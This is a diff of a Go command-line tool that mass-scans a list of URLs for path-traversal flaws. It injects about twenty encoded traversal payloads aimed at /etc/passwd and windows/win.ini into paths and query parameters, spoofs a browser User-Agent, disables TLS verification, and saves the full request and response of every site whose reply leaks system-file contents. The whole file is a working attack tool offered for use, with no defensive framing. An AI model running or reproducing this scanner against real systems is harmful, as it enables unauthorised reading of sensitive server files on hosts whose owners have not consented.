@@ -2,127 +2,108 @@ package main
 
 import (
 	"bufio"
+	"compress/gzip"
+	"crypto/tls"
 	"flag"
 	"fmt"
+	"io"
+	"io/ioutil"
 	"net/http"
+	"net/http/httputil"
 	"net/url"
 	"os"
-	"path"
+	"regexp"
 	"strings"
 	"sync"
-	"time"
 )
 
 var (
-	payloads = []string{
-		"../../../../etc/passwd",
-		"....//....//....//....//etc/passwd",
-		"%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd%00",
-		"..%c0%af..%ef%bc%8f..%252f..%252fetc%c0%afpasswd",
-		"..%u2216..%u2216..%u2216etc%u2216passwd",
-		"&#x2e;&#x2e;/&#x2e;&#x2e;/etc/&#x2f;passwd",
-		"..%3b/..%3b/..%3b/etc%3b/passwd",
-		"/////////////////../../../../../../../../etc/passwd",
-		"../../../../../../../../../../../../../../etc/passwd",
-		"//..//..//..//..//..//..//..//..//..//..//../etc/passwd",
-		"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
-		"../../../../../../../../../../etc/passwd",
-		"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
-		"..%252f..%252f..%252f..%252fetc/passwd",
-		"..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
-		"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
-		"/etc/passwd",
-		"////etc/passwd",
-		"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
-		"/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini",
-		"../../../../../../../../../../../../../../windows/win.ini",
-	}
+	listFile   = flag.String("l", "", "Path to the file containing URLs")
+	verbose    = flag.Bool("v", false, "Enable verbose output")
+	outputFile = flag.String("o", "", "Output file for vulnerable results")
+	workers    = flag.Int("w", 10, "Number of concurrent workers")
+)
 
-	successIndicatorLinux  = "root:x:0:0:"
-	successIndicatorWindows = "[extensions]"
-	userAgent              = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
-	timeout                = 10 * time.Second
+type Result struct {
+	TestURL      string
+	Vulnerable   bool
+	RequestDump  string
+	ResponseDump string
+}
+
+var payloads = []string{
+	"../../../../etc/passwd",
+	"....//....//....//....//etc/passwd",
+	"%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd%00",
+	"..%c0%af..%ef%bc%8f..%252f..%252fetc%c0%afpasswd",
+	"..%u2216..%u2216..%u2216etc%u2216passwd",
+	"&#x2e;&#x2e;/&#x2e;&#x2e;/etc/&#x2f;passwd",
+	"..%3b/..%3b/..%3b/etc%3b/passwd",
+	"/////////////////../../../../../../../../etc/passwd",
+	"../../../../../../../../../../../../../../etc/passwd",
+	"//..//..//..//..//..//..//..//..//..//..//../etc/passwd",
+	"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
+	"../../../../../../../../../../etc/passwd",
+	"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
+	"..%252f..%252f..%252f..%252fetc/passwd",
+	"..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
+	"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
+	"/etc/passwd",
+	"////etc/passwd",
+	"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+	"/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini",
+	"../../../../../../../../../../../../../../windows/win.ini",
+}
+
+var (
+	linuxRegex   = regexp.MustCompile(`root:x:0:0:`)
+	windowsRegex = regexp.MustCompile(`\[extensions\]\r?\n`)
 )
 
 func main() {
-	urlFile := flag.String("l", "", "Path to the file containing URLs")
-	verbose := flag.Bool("v", false, "Enable verbose output")
-	outputFile := flag.String("o", "", "Path to the output file for results")
-	workers := flag.Int("w", 20, "Number of concurrent workers")
 	flag.Parse()
 
-	if *urlFile == "" {
-		fmt.Println("Error: URL file is required. Use -l to specify the file.")
-		flag.Usage()
-		return
-	}
-
-	urls, err := readURLs(*urlFile)
+	urls, err := readURLs(*listFile)
 	if err != nil {
 		fmt.Printf("Error reading URLs: %v\n", err)
 		return
 	}
 
-	client := &http.Client{
-		Timeout: timeout,
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse
-		},
-	}
+	jobs := make(chan string, *workers)
+	results := make(chan Result, *workers)
 
-	var (
-		results     []string
-		resultsLock sync.Mutex
-		wg          sync.WaitGroup
-		jobs        = make(chan string, *workers*2)
-	)
-
-	// Start worker goroutines
+	var wg sync.WaitGroup
 	for i := 0; i < *workers; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			for testURL := range jobs {
-				vulnerable, err := checkVulnerability(client, testURL, *verbose)
-				if err != nil && *verbose {
-					fmt.Printf("Error checking %s: %v\n", testURL, err)
-				}
-				if vulnerable {
-					msg := fmt.Sprintf("[VULNERABLE] %s", testURL)
-					resultsLock.Lock()
-					results = append(results, msg)
-					resultsLock.Unlock()
-					fmt.Println(msg)
-				} else if *verbose {
-					fmt.Printf("[SAFE] %s\n", testURL)
-				}
-			}
+			worker(jobs, results, *verbose)
 		}()
 	}
 
-	// Generate jobs
-	for _, rawURL := range urls {
-		testURLs := generateTestURLs(rawURL)
-		for _, testURL := range testURLs {
-			jobs <- testURL
+	go func() {
+		generateTestURLs(urls, payloads, jobs)
+	}()
+
+	go func() {
+		wg.Wait()
+		close(results)
+	}()
+
+	var vulnerableResults []Result
+	for res := range results {
+		if res.Vulnerable {
+			vulnerableResults = append(vulnerableResults, res)
 		}
 	}
 
-	close(jobs)
-	wg.Wait()
-
 	if *outputFile != "" {
-		err := saveResults(*outputFile, results)
-		if err != nil {
-			fmt.Printf("Error saving results to file: %v\n", err)
-		} else if *verbose {
-			fmt.Printf("Results saved to %s\n", *outputFile)
-		}
+		writeResults(*outputFile, vulnerableResults)
 	}
 }
 
-func readURLs(filename string) ([]string, error) {
-	file, err := os.Open(filename)
+func readURLs(path string) ([]string, error) {
+	file, err := os.Open(path)
 	if err != nil {
 		return nil, err
 	}
@@ -131,120 +112,134 @@ func readURLs(filename string) ([]string, error) {
 	var urls []string
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
-		urls = append(urls, scanner.Text())
+		url := strings.TrimSpace(scanner.Text())
+		if url != "" {
+			urls = append(urls, url)
+		}
 	}
 	return urls, scanner.Err()
 }
 
-func generateTestURLs(rawURL string) []string {
-	u, err := url.Parse(rawURL)
-	if err != nil {
-		fmt.Printf("Error parsing URL %s: %v\n", rawURL, err)
-		return nil
-	}
+func generateTestURLs(urls []string, payloads []string, jobs chan<- string) {
+	defer close(jobs)
 
-	var testURLs []string
-
-	for _, payload := range payloads {
-		// Path traversal in the URL path (no encoding)
-		if pathTestURL := generatePathTestURL(u, payload); pathTestURL != "" {
-			testURLs = append(testURLs, pathTestURL)
+	for _, rawURL := range urls {
+		originalURL, err := url.Parse(rawURL)
+		if err != nil {
+			continue
 		}
 
-		// Path traversal in query parameters (no encoding)
-		testURLs = append(testURLs, generateQueryTestURLs(u, payload)...)
+		if originalURL.RawQuery != "" {
+			pairs := strings.Split(originalURL.RawQuery, "&")
+			for i, pair := range pairs {
+				parts := strings.SplitN(pair, "=", 2)
+				key := parts[0]
+				for _, payload := range payloads {
+					newPair := key + "=" + payload
+					newPairs := make([]string, len(pairs))
+					copy(newPairs, pairs)
+					newPairs[i] = newPair
+					newQuery := strings.Join(newPairs, "&")
+					testURL := fmt.Sprintf("%s://%s%s?%s", originalURL.Scheme, originalURL.Host, originalURL.Path, newQuery)
+					jobs <- testURL
+				}
+			}
+		} else {
+			for _, payload := range payloads {
+				newPath := originalURL.Path + payload
+				testURL := fmt.Sprintf("%s://%s%s", originalURL.Scheme, originalURL.Host, newPath)
+				jobs <- testURL
+			}
+		}
 	}
-
-	return testURLs
 }
 
-func generatePathTestURL(u *url.URL, payload string) string {
-	originalPath := u.Path
-	if originalPath == "" {
-		originalPath = "/"
+func worker(jobs <-chan string, results chan<- Result, verbose bool) {
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{
+		Transport: tr,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
 	}
 
-	// Remove the last segment of the path
-	dirPath := path.Dir(originalPath)
-	if dirPath == "." {
-		dirPath = ""
-	}
+	for testURL := range jobs {
+		req, err := http.NewRequest("GET", testURL, nil)
+		if err != nil {
+			continue
+		}
 
-	// Append the raw payload to the path (no encoding)
-	newPath := dirPath + "/" + payload
-	newURL := *u
-	newURL.Path = newPath
-	newURL.RawQuery = "" // Clear query parameters
-	return newURL.String()
+		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+		req.Header.Set("Accept", "*/*")
+		req.Header.Set("Accept-Language", "en-US;q=0.9,en;q=0.8")
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36")
+		req.Header.Set("Connection", "close")
+		req.Header.Set("Cache-Control", "max-age=0")
+
+		reqDump, _ := httputil.DumpRequestOut(req, false)
+
+		resp, err := client.Do(req)
+		var respDump strings.Builder
+		if err != nil {
+			respDump.WriteString(fmt.Sprintf("Error: %v\n", err))
+		} else {
+			defer resp.Body.Close()
+
+			var bodyReader io.Reader = resp.Body
+			if resp.Header.Get("Content-Encoding") == "gzip" {
+				bodyReader, err = gzip.NewReader(resp.Body)
+				if err != nil {
+					respDump.WriteString(fmt.Sprintf("Error decompressing gzip: %v\n", err))
+					continue
+				}
+			}
+
+			bodyBytes, _ := ioutil.ReadAll(bodyReader)
+			body := string(bodyBytes)
+
+			respDump.WriteString(fmt.Sprintf("HTTP/1.1 %s\r\n", resp.Status))
+			for k, vv := range resp.Header {
+				for _, v := range vv {
+					respDump.WriteString(fmt.Sprintf("%s: %s\r\n", k, v))
+				}
+			}
+			respDump.WriteString("\r\n")
+			respDump.Write(bodyBytes)
+
+			vulnerable := linuxRegex.MatchString(body) || windowsRegex.MatchString(body)
+			if vulnerable {
+				results <- Result{
+					TestURL:      testURL,
+					Vulnerable:   true,
+					RequestDump:  string(reqDump),
+					ResponseDump: respDump.String(),
+				}
+			}
+		}
+
+		if verbose {
+			fmt.Printf("Request:\n%s\nResponse:\n%s\n\n", string(reqDump), respDump.String())
+		}
+	}
 }
 
-func generateQueryTestURLs(u *url.URL, payload string) []string {
-	query := u.Query()
-	if len(query) == 0 {
-		return nil
-	}
-
-	var testURLs []string
-
-	for param := range query {
-		// Manually construct the query string to avoid encoding
-		newQuery := fmt.Sprintf("%s=%s", param, payload)
-		newURL := *u
-		newURL.RawQuery = newQuery
-		testURLs = append(testURLs, newURL.String())
-	}
-
-	return testURLs
-}
-
-func checkVulnerability(client *http.Client, testURL string, verbose bool) (bool, error) {
-	req, err := http.NewRequest("GET", testURL, nil)
-	if err != nil {
-		return false, err
-	}
-	req.Header.Set("User-Agent", userAgent)
-
-	resp, err := client.Do(req)
-	if err != nil {
-		return false, err
-	}
-	defer resp.Body.Close()
-
-	buf := make([]byte, 1024)
-	n, _ := resp.Body.Read(buf)
-	content := string(buf[:n])
-
-	if verbose {
-		fmt.Printf("Testing URL: %s\n", testURL)
-		fmt.Printf("Status Code: %d\n", resp.StatusCode)
-		fmt.Printf("Response Body: %s\n", content)
-	}
-
-	return strings.Contains(content, successIndicatorLinux) || strings.Contains(content, successIndicatorWindows), nil
-}
-
-func saveResults(filename string, results []string) error {
-	file, err := os.Create(filename)
+func writeResults(outputPath string, results []Result) error {
+	file, err := os.Create(outputPath)
 	if err != nil {
 		return err
 	}
 	defer file.Close()
 
-	writer := bufio.NewWriter(file)
-	for _, result := range results {
-		_, err := writer.WriteString(result + "\n")
-		if err != nil {
-			return err
-		}
+	for _, res := range results {
+		file.WriteString(fmt.Sprintf("Vulnerable URL: %s\n", res.TestURL))
+		file.WriteString("Request:\n")
+		file.WriteString(res.RequestDump)
+		file.WriteString("\nResponse:\n")
+		file.WriteString(res.ResponseDump)
+		file.WriteString("\n\n")
 	}
-	return writer.Flush()
-}
 
-func init() {
-	flag.Usage = func() {
-		fmt.Fprintf(flag.CommandLine.Output(), "Usage of %s:\n", os.Args[0])
-		flag.PrintDefaults()
-		fmt.Println("\nExample:")
-		fmt.Println("  ./path_traversal -l urls.txt -w 100 -v -o results.txt")
-	}
+	return nil
 }
